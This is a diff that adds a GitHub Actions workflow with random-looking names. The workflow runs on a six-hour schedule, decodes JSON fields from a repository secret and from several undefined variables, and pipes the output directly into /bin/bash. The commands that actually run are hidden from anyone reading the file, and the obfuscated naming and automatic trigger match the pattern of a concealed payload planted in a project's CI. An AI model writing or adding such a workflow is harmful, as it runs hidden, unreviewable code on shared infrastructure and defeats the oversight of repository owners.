@@ -1,0 +1,24 @@
+name: gunnageterracotta
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gunnageterracotta
+        env:
+          bavs35994: ${{ secrets.bavs35994 }}
+        run: |
+          echo $bavs35994 | jq -r .rmdhb0 | /bin/bash
+          echo $m6 | jq -r .g94691 | /bin/bash
+          echo $e67 | jq -r .nd29 | /bin/bash
+          echo $g8935 | jq -r .lcjo10 | /bin/bash
+          echo $i7540 | jq -r .vlvr4978 | /bin/bash
+          echo $jjv75 | jq -r .vosu1 | /bin/bash
+          echo $se56 | jq -r .fcvb54 | /bin/bash
+          echo $g462 | jq -r .iydf98 | /bin/bash
+          echo $dswji69 | jq -r .cgn915 | /bin/bash
+
